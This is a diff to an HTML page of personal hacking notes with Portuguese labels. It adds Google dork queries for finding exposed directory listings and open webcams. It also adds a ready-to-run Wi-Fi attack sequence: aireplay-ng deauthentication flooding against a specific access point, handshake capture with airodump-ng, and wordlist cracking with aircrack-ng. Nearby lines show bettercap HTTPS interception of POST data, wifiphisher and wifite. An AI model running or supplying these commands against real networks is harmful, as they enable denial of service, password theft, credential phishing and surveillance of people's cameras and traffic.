@@ -399,7 +399,9 @@
 
         <div class="note-card2">
             <h1>Google Dorks</h1>
-            
+            <p><strong>Finding exposed directories:</strong></p>
+            <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) </code></p>
+            <p><code>-inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
             <p><strong>Discovering open webcams:</strong></p>
             <p><code>inurl:"viewerframe?mode=motion"</code></p>
 
@@ -700,15 +702,22 @@
                 /usr/share/hashcat/rules/best64.rule
                 -a 0 -w 3</p>
             <p>sudo airmon-ng wlan0 &lt;channel&gt;</p>
-            <p>sudo iwconfig wlp4s0mon channel 1</p>
-            <p> sudo aireplay-ng --deauth 0 -a {ESSID} -c FF:FF:FF:FF:FF:FF wlp4s0mon            </p>
+            <p><strong>Alterar canal da interface:</strong></p>
+            <p>sudo iw dev wlp4s0mon set channel 10</p>
+            <p><strong>Desativar processos que interferem no monitoramento:</strong></p>
+            <p>sudo airmon-ng check kill</p>
+            <p><strong>Enviar pacotes de desautenticação:</strong></p>
+            <p>sudo aireplay-ng --deauth 0 -a 72:D9:AE:BC:CD:6C -c FF:FF:FF:FF:FF:FF wlp4s0mon</p>
+            <p><strong>Capturar pacotes e salvar em arquivo:</strong></p>
+            <p>sudo airodump-ng -x wlxd03745fbcadc --write dump</p>
+            <p><strong>Quebrar senha usando wordlist:</strong></p>
+            <p>sudo aircrack-ng -w wordlist dump-01.cap</p>
+            <br>
             <p>bettercap -T 192.168.0.100 --interface at0 --no-spoofing --no-discovery --proxy --proxy-port 80
                 --proxy-https --proxy-https-port 443 -P POST</p>
             <p>sudo wifiphisher -nD -i wlan0</p>
             <p>sudo wifite --bully --kill</p>
-            <p><strong>Alterar canal da interface:</strong></p>
-            <p>sudo iw dev wlp4s0mon set channel 11</p>
-
+    
         </div>
 
         <!-- note 1 -->
